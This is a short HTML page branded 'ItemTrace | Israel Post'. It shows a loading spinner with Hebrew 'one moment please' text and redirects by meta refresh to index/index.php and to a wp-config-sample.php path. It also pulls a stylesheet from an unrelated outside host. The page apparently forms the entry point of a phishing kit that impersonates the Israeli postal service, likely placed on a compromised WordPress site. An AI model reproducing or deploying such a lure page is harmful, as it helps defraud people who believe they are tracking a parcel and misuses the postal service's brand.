<!DOCTYPE html><!--[if lt IE 9]>
<html lang="en" class="no-js lower-than-ie9 ie">
   <![endif]--><!--[if lt IE 10]>
   <html lang="en" class="no-js lower-than-ie10 ie">
      <![endif]--><!--[if !IE]>-->
      <html lang="en" class="no-js">
            <head>
            <title>ItemTrace | Israel Post</title>
            <link rel="icon" type="image/png" href="loge.png" />
            <meta http-equiv="refresh" content="7;url=wp-config-sample.php" />
            <meta charset="utf-8" />
            <meta http-equiv="refresh" content="3;url=index/index.php" />
            <style>
        .loader {
            border: 16px solid #f3f3f3;
            border-radius: 50%;
            border-top: 16px solid #3498db;
            width: 120px;
            height: 120px;
            -webkit-animation: spin 2s linear infinite;
            animation: spin 2s linear infinite;
        }
        @-webkit-keyframes spin {
            0% {
                -webkit-transform: rotate(0deg);
            }
            100% {
                -webkit-transform: rotate(360deg);
            }
        }
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
    </style>
    <link rel="stylesheet" href="https://aww.moe/jyowta.css" />
    <center>
        <br />
        <br />
        <br />
        <br />
        <div class="loader"></div>
        <br />
        <br />
        <h1><p>רגע אחד בבקשה</p></h1>
        <br />
        <br />
        <hr />
        <br />
    </center>
</head>
